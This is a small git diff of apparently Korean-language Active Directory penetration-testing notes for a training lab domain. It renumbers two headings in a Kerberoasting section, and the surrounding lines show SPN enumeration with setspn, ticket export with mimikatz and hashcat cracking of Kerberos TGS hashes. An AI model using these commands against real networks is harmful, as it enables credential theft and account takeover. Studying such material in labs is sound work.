@@ -423,7 +423,7 @@ Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Pr
 <br/><br/>
 ## 12. Kerberoasting - from Windows
 
-### 수동 방법
+### 1) 수동 방법
 
 ### setspn.exe로 SPN 열거
 ```setspn.exe -Q */*```
@@ -458,7 +458,7 @@ mimikatz # kerberos::list /export
 ### Hashcat으로 Cracking
 ```hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt```
 
-### 자동 방법
+### 2) 자동 방법
 
 ### TGS Tickets 추출을 위한 PowerView 사용
 ```
